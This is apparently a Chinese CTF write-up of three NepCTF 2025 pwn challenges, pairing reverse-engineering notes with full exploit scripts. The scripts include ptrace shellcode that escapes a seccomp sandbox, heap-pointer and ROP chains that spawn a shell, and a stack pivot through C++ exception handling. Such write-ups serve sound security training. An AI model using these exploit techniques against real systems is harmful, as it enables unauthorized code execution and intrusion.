---
title: Nepctf-2025-pwn
tags:
    - 中等难度
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# Nepctf--pwn复现

## time

## smallbox

### 查看沙箱

题目名字和描述都很明显，拖下来首先就是看一下沙箱。发现只允许一个syscall，ptrace。之前也没遇到过这类题目，先去了解了一下。

![image-20250728093312153](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093312153.png)

### ida分析

先用mmap分配了一块空间，并给了可读可写可执行的权限。然后fork，然后read，然后上沙箱。最后会调用shellcode。

![image-20250728093914695](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093914695.png)

### 思路

1.沙箱禁用了其他函数，只能使用ptrace 操作。可以获取子进程pid，所以可以操作子进程。 因为沙箱再后面install ，但是子进程出来一直在循环，所以还没装沙箱。

2.利用ptrace修改子进程rip，使其跳过沙箱。同时通过ptrace 往子进程的空间中写入shellcode ，最后让子进程跳转到这，因为没有沙箱，所以子进程就可以getshell。

### exp

当时写的时候，没有通过ptrace,去往里写，以为父进程中读入的shellcode，子进程也有。反复尝试了很久，都失败了。还以为是attach 失败，又或者是改rip错了。后面意识到，一个点，父进程中输入的shellcdoe ，子进程不应该有才对，才反应过了同过ptrace往里写。也是学到了。

之前看到fork 只能联想到爆破cananry，现在知道可以通过ptrace控制子进程了。

```python
from esy import *
context.log_level='debug'
context.arch="amd64"
#io,elf=loadfile("./smallbox","",0)
#context.terminal=['tmux','splitw','-h','-l','66%']
host="nepctf31-oted-rgpe-shrp-juf9qwjd6957.nepctf.com"
port=443
io= remote(host, port, ssl=True, sni=host)
execve_shellcode=(
b'\x48\xC7\xC0\x3b\x00\x00\x00' # mov rax,0x3b
b'\x48\xBF\x19\xE0\x0D\xDC\xEA\x0D\x00\x00' # mov rdi,0xdeadc0de019
b'\x48\x31\xf6'   # xor rsi,rsi
b'\x48\x31\xD2'   # xor rdx,rdx
b'\x0f\x05'       # syscall
b'/bin/sh\x00'
)

shellcode=(
b'\x44\x8B\x7D\xF4' # mov r15d,[rbp-0xc]
b'\x44\x89\xFe'     # mov edi,r15d
b'\x48\xC7\xC0\x65\x00\x00\x00' # mov rax,101
b'\x48\xC7\xC7\x10\x00\x00\x00' # mov rsi,10h
b'\x48\x31\xD2'   # xor rdx,rdx
b'\x4D\x31\xD2'   # xor r10,r10
b'\x0f\x05'       # syscall

b'\x44\x89\xFe'     # mov edi,r15d
b'\x48\xC7\xC0\x65\x00\x00\x00' # mov rax,101
b'\x48\xC7\xC7\x0c\x00\x00\x00' # mov rsi,ch
b'\x48\x31\xD2'   # xor rdx,rdx
b'\x49\xBA\x00\xE5\x0D\xDC\xEA\x0D\x00\x00'   # mov r10,0x0deadc0de500
b'\x0f\x05'       # syscall
)
shellcode+=(
b'\x49\xB8\x00\xE0\x0D\xDC\xEA\x0D\x00\x00'   # mov r8,0x0deadc0de000
b'\x49\xB9\x00\xE2\x0D\xDC\xEA\x0D\x00\x00'   # mov r8,0x0deadc0de200
)
shellcode+=4*(
b'\x48\xC7\xC0\x65\x00\x00\x00' # mov rax,101
b'\x44\x89\xFe'     # mov edi,r15d
b'\x48\xC7\xC7\x05\x00\x00\x00' # mov rsi,10h
b'\x4C\x89\xC2' # mov rdx, r8
b'\x4D\x8B\x11'#mov  r10, [r9]
b'\x0f\x05'       # syscall

b'\x49\x83\xC0\x08' # add r8+8
b'\x49\x83\xC1\x08' # add r8+8
)
shellcode+=(
b'\x49\xB9\x00\xE0\x0D\xDC\xEA\x0D\x00\x00' #  mov r9,0x0deadc0de200
b'\x49\xB8\x00\xE5\x0D\xDC\xEA\x0D\x00\x00'   # mov r8,0x0deadc0de500
b'\x4D\x89\x88\x80\x00\x00\x00'             #  mov    [r8+0x80],r9

b'\x44\x89\xFe'     # mov edi,r15d
b'\x48\xC7\xC0\x65\x00\x00\x00' # mov rax,101
b'\x48\xC7\xC7\x0d\x00\x00\x00' # mov rsi,dh
b'\x48\x31\xD2'   # xor rdx,rdx
b'\x49\xBA\x00\xE5\x0D\xDC\xEA\x0D\x00\x00'   # mov r10,0x0deadc0de500
b'\x0f\x05'       # syscall

b'\x44\x89\xFe'     # mov edi,r15d
b'\x48\xC7\xC0\x65\x00\x00\x00' # mov rax,101
b'\x48\xC7\xC7\x11\x00\x00\x00' # mov rsi,17h
b'\x48\x31\xD2'   # xor rdx,rdx
b'\x4D\x31\xD2'   # xor r10,r10
b'\x0f\x05'       # syscall
)
shellcode+=asm('''
loop:
    jmp loop
''')
shellcode=shellcode.ljust(0x200,b'\x61')
shellcode+=execve_shellcode
#gdb.attach(io)
io.send(shellcode)
io.interactive()
```



## astray

### ida 分析

首先这题很绕，几个地址跳来跳去的，我们要先从init详细分析清楚结构

| 地址            | 保存内容       |
| ---------------------------- | --------------- |
| manage_physic[0] |heap_addr |
| magnage_physic[2*i]    (偶数项) | heap_addr+256*i |
| heap2                        | 0               |
| heap2+0x8                    | 0               |
| heap2+0x10                   | 0               |
| V3                           | heap_addr       |
| heap_addr                    | 1               |
| heap_addr+0x8                | heap3           |
| heap_addr+0x10               | &onlyuser       |
| heap3                        | 0               |
| heap3+0x8                    | 0               |
| heap3+0x10                   | 0               |

可以看到，mange_pyhsic , heap2 ，heap_addr(heap1),heap3,几个变量，其中，heap1，heap3，不在bss上，user中依靠heap2去寻址，manage中依靠heap1去寻址。寻址通过idx ，从manage_physic中赋值给heap2，和heap3 。这里有一个逻辑漏洞，在check中。

#### check函数

![image-20250804134532550](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804134532550.png)

这里只检测，idx大于等于0x14也就是20 ，但没有检测下限，如果这里的idx等于0，那么后面赋值时，就会发生巨大的变化。同时，两个用户可以互用对方的操作。

但是在check函数还有一个检测，如果是idx是0 ，即 n0x14=0，那么v5= manage_physic.所以v5[1]=*(manage_physic+8),也就是0x10，是过不了检测的。

正常情况下，我们会读写magnage_physic[2*i] 中的内容，但是如果i=0，在User中，我们可以写heap1 这个堆块的内容 ，这里可以修改掉其上的指针，如果后续可以对其上的指针进行读写，那就可以任意地址读写。在manage中会有不同

![image-20250804143259945](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804143259945.png)

这里有两个可以读写的地址，** (heap+8),是heap3，也就是与idx相关的。** （ *  （heap+16）+ 8），这是 ** heap2，也就是user中 依靠的寻址方式。同时补充一下对权限的检测

![image-20250804162343842](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804162343842.png)

在初始化时，这里对每一个块都初始了权限，那么其实对& 运算稍微了解一下就知道了。因为manage_physic[0]的权限是0x10，很特殊，似乎manage和user都没有权限去修改。但是，如果进入manage时，**使用user_write去执行呢，似乎可以避开权限的检测**，但是后续会继续检测，也无法往里write。

### 思路分析

#### 通过MANAGE_visit

因为直接使用两个write都过不了检测，但是我们使用manage_visit 可以轻松过check，只要heap2不为空。也就说，只要在usr中，过check赋值，就可以在manage中读写。那么我们进入usr_operation,输入MANAGE_visit，就可以过check赋值，而且不做读写操作。此时heap2[0]=heap_addr.
再从manage_operation中读，可以读到pie和堆的地址信息。再写，就可以覆盖heap1 中 的内容。如果选择覆盖heap1+0x8，那么下次准备往目标写的时候，这个位置又会被覆盖掉。
所以，只能通过heap1+0x10的位置来完成任意地址读写。我们把改写后的地方称为fake_addr(位置与&onlyuser位置重合),那么我们之后从manage中访问到的就是** (fake_addr+0x8).

![image-20250805013545343](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805013545343.png)

#### 任意地址读写

这样看就清楚很多，如果我们把heap1+0x10 修改为 heap3-8，那么我们可以通过manage_write,修改* (magnage_physic[2*i])，继而通过manage_visit,去任意地址读写。

#### 泄露stack，再rop

有读写，泄露的思路自然不用多说。那最后如何getshell呢？保护机制全开，不能修改got，排除syscall和 shellcode ，那就只能rop了，所以还要泄露栈地址。通过libc中的environ泄露栈地址，这个地址与返回地址的偏移动调直接看就行。

### exp

```python
from esy import *
context.log_level='debug'
#context.terminal=['tmux','splitw','-h','-l','66%']
io,elf=loadfile("./astray")
libc=ELF("./libc.so.6")

#manager=0x41A8
# 0x4060
pop_rdi=0x2a3e5
ret=0x29139
def manager(op,idx):
    io.recvuntil("Which permission do you want to log in with?(1:manager 1000:user)")
    io.sendline(str(1))
    io.recvuntil("visit user(MANAGER_visit)\n")
    io.send(op)
    io.recvuntil("1-19: manager can visit\n")
    io.sendline(str(idx))

def user(op,idx):
    io.recvuntil("Which permission do you want to log in with?(1:manager 1000:user)")
    io.sendline(str(1000))
    io.recvuntil("user write to logs(USER_write)\n")
    io.send(op)
    io.recvuntil("10-19: user can visit\n")
    io.sendline(str(idx))
 
def manager_read():
	manager("MANAGER_read","1")
	
def manager_write(content):
	manager("MANAGER_write","1")
	io.send(content)
	
def manager_user_read():
	manager("MANAGER_visit",1)
	io.sendlineafter("to user_logs\n","1")
	
def manager_user_write(content):
	manager("MANAGER_visit",1)
	io.sendlineafter("to user_logs\n","2")
	io.send(content)
	    
#gdb.attach(io,"b *$rebase(0x179F)")
# leak pie & heap
user("MANAGER_visit",0)
manager_user_read()
io.recv(8)
heap_addr=u64(io.recv(6).ljust(8,b'\x00'))#-0x1f30
io.recv(2)
pie=u64(io.recv(6).ljust(8,b"\x00"))-0x41a0
logv("heap_addr",hex(heap_addr))
logv("pie",hex(pie))

# heap1-> next = manage_physic[2]
manager_user_write(p64(1)+p64(heap_addr)+p64(heap_addr-8))

# leak libc
manager_write(p64(pie+elf.got["puts"]))
manager_user_read()
puts=u64(io.recv(6).ljust(8,b"\x00"))
libc_base=puts-libc.sym["puts"]
logv("libc_base",hex(libc_base))
system=libc_base+libc.sym["system"]
bin_sh=libc_base+next(libc.search("/bin/sh\x00"))
pop_rdi=libc_base+pop_rdi
ret=libc_base+ret
# leak stack
manager_write(p64(libc_base+libc.sym["environ"]))
manager_user_read()
stack=u64(io.recv(6).ljust(8,b'\x00'))-0x150

# heap1->next=stack
manager_write(p64(stack))
payload=p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
manager_user_write(payload)

#user("USER_write",0)
#io.sendlineafter("user_logs\n",str(1))
io.interactive()

```



## canutrytry

### 查看沙箱

![image-20250805082927143](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805082927143.png)



只允许read，write，close，futex的syscall。看来是要ORW了。

### ida 分析

打开一看发现这是一道c++的题目。先从main函数开始分析函数的主要逻辑。

#### main



![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805210913492.png)

先看汇编，发现有很多try，catch，这是c++的异常处理。反汇编后这些部分没有显示出来，我们先不看，先分析主要功能。

![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213430837.png)

两个主要功能，visit()和left()

##### visit

![visit函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213930699.png)
![visit函数](C:/Users/22354/AppData/Roaming/Typora/typora-user-images/image-20250805214633791.png)

visit中有三个选项，2只能按顺序设置堆块大小且只有2次，1 只能按顺序malloc两次堆块，3 可以任意写堆块的内容。且idx无检测。

1 选项中有对异常的处理。

##### left

![left函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805221246184.png)

只有一次机会，可以把堆块的内容复制到栈上，大小无限制。且有对异常的处理。

毫无疑问，此题中异常处理是至关重要的。所以我们接下来要分析所以try ，catch的对应关系。

### 异常处理对应

##### 分析方法

ida在汇编代码中，会对catch标记，在其后面标注owner by xxx

![catch](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222122309.png) 

根据这样的对应关系，我们可以把main函数重新反汇编一下，把完整的函数逆向出来。

当然ida 有视图可以更好的看出函数的跳转对应关系

![跳转](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222435058.png)

##### 分析结果

```c
int main(){
    seccomp_add();
    while(1)
    {
        while(1){
            try{
                menu();
            }
            catch{
                sub_4016ec();
                sub_401652();
            }
        
            try{
                stdin>>choice;
                if(choice!=1) break;
                visit_nep();
                if(choice!=2) exit(0);
                left_nep();
            }
            catch{
                std::cout << "you catch the error " << err2 << std::endl;
                std::cout << "here is a gift for you!" << std::endl;
    
                printf("setbufaddr:%p\n", setbuf_ptr);
                printf("stackaddr:%p\n", &choice);
            }
        }

    } 
    
}
```

#### 思路分析

1. 首先要通过visit或left中的异常处理，泄露出stack和 libc的信息。要注意的是，为了后续利用，这一步显然是通过visit 的异常，也就是size值非法。再注意，因为只能按顺序来，所以第一个堆块不能非法。所以要先申请第一个堆块后，利用第二个堆块的大小非法，触发异常拿到stack 和 libc 
2. 紧接着，要利用left中的异常，也就是复制的内容长度超过16.这里需要让异常处理跳转到menu（）的异常处理。只要把left的返回地址，修改为menu 函数执行完成时的返回地址就行。
3. 第二步完成后，程序跳转到0x4610ec。这里会往bss 段上read ，显然是用来输入ROP的。
4. 第三步过后，通过0x401652函数，程序最后跳转到0x4015d4。又有一次read，可以覆盖到rbp，同样会触发异常。但是最后还是会leave_ret,可以栈迁移。只要把rbp覆盖为之前输入ROP的地址-8 ，就行。

### exp

```python
from esy import *
context.log_level='debug'
io,elf=loadfile("./canutrytry","",0)
libc=ELF("./libc.so.6")
def visit():
	io.sendlineafter("your choice >>","1")
	
def leave():
	io.sendlineafter("your choice >>","2")

def visit_op(op,size,idx): # size(content),1
	visit()
	io.sendlineafter("your choice >>",str(op))
	if op == 2 :
		io.sendlineafter("size",str(size))
	elif op == 3 :
		io.sendlineafter("index",str(idx))
		io.sendafter("content",size)

def leave_op(idx):
	leave()
	io.sendlineafter("index: ",str(idx))


gdb.attach(io,"b *0x401600")
#1 leak libc & stack
visit_op(2,0x40,0)
visit_op(1,0,0)
visit_op(2,-1,0)
visit_op(1,0,0)

io.recvuntil("setbufaddr:")
libc_base=int(io.recv(14),16)-0x88060
io.recvuntil("stackaddr:")
stack=int(io.recv(14),16)
logv("libc",hex(libc_base))
logv("stack",hex(stack))

write=libc_base+libc.sym["write"]
## gadgets
pop_rdi=libc_base + 0x2a3e5
pop_rsi=libc_base + 0x2be51
pop_rdx=libc_base + 0x11f497  # pop rdx;pop r12;ret
leave_ret=0x401650
## addr 
ROP=0x4016EC
flag=0x4053C0
buf=0x405460

#2 prepare my ROP 
payload=0x20*b"a"+p64(buf)+p64(0x401ed9)
visit_op(3,payload,0)
leave_op(0)

#3 orw  flag
payload = p64(0)+p64(pop_rdi)+p64(2)
payload+= p64(pop_rsi)+p64(flag)
payload+= p64(pop_rdx)+p64(0x64)+p64(0)
payload+= p64(write)
io.sendafter("well,prepare your rop now!",payload)

#4
payload = b"a"*0x10
payload+= p64(buf) 
io.sendafter("Enter your flag: ",b"hhhh")

#5
io.send(payload) 
io.interactive()

```

